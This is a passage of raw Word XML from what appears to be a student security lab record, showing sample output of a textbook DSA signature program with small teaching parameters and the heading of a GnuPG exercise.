      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>x</w:t>
      </w:r>
      <w:r>
        <w:t>=0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>x&lt;n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
      <w:r>
        <w:t>x++)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:line="260" w:lineRule="exact"/>
        <w:ind w:left="1060"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>{</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="5"/>
        <w:ind w:left="1540"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>um</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>=</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>* x +</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>b * (-y);</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1540"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>f(sum</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>==</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>1)</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="2020"/>
      </w:pPr>
      <w:r>
        <w:t>re</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>urn x;</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="1060"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="580"/>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
        <w:sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1060" w:right="1340" w:bottom="280" w:left="1140" w:header="0" w:footer="1185" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="70"/>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>O</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ut:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId35">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gcc</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>sa.c</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:hyperlink r:id="rId36">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t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>a.out</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>im</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>nu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>ber p and e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er q pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>e d</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>v</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>sor</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>of (p-1):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>1279 71</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">h </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t>uch</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>gre</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">er </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">1 and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>(p-1):</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>ser's pr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e key such </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s grea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han 0 and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">ess </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han q :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>15</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-2"/>
        </w:rPr>
        <w:t>u</w:t>
      </w:r>
      <w:r>
        <w:t>ser's pe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-6"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>essage secret</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">key k such </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>hat</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>s grea</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>han 0 and</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:t>an q :</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>10</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>E</w:t>
      </w:r>
      <w:r>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>he hash(M) va</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ue</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>123</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="16" w:line="260" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100"/>
      </w:pPr>
      <w:r>
        <w:t>*********Co</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>m</w:t>
      </w:r>
      <w:r>
        <w:t>pu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-4"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-25"/>
        </w:rPr>
        <w:t>V</w:t>
      </w:r>
      <w:r>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:t>ues*********</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="8095"/>
      </w:pPr>
      <w:r>
        <w:t>g =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-10"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t>157 y =</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>851</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:ind w:left="100" w:right="5172"/>
      </w:pPr>
      <w:r>
        <w:t>Genera</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ed</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="2"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:t>gna</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:t>ure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Sender = ( 32, 39)</w:t>
      </w:r>
      <w:hyperlink r:id="rId37">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sectPr w:rsidR="00090D7C">
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="134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436" w:right="1375" w:hanging="4336"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Ex. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>N</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">o.: 12                                                                                                           </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="54"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>D</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">ate: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>G</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>NU</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:spacing w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>G</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02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20" w:bottom="280" w:left="1140" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="2" w:space="720" w:equalWidth="0">
            <w:col w:w="620" w:space="190"/>
            <w:col w:w="8930"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-17"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>o do a secure</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>da</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>rans</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>mi</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>on us</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>ng Gnu</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:spacing w:val="-1"/>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:position w:val="-1"/>
        </w:rPr>
        <w:t>G.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
        <w:spacing w:before="12" w:line="240" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00090D7C" w:rsidRDefault="00090D7C" w:rsidP="00090D7C">
      <w:pPr>
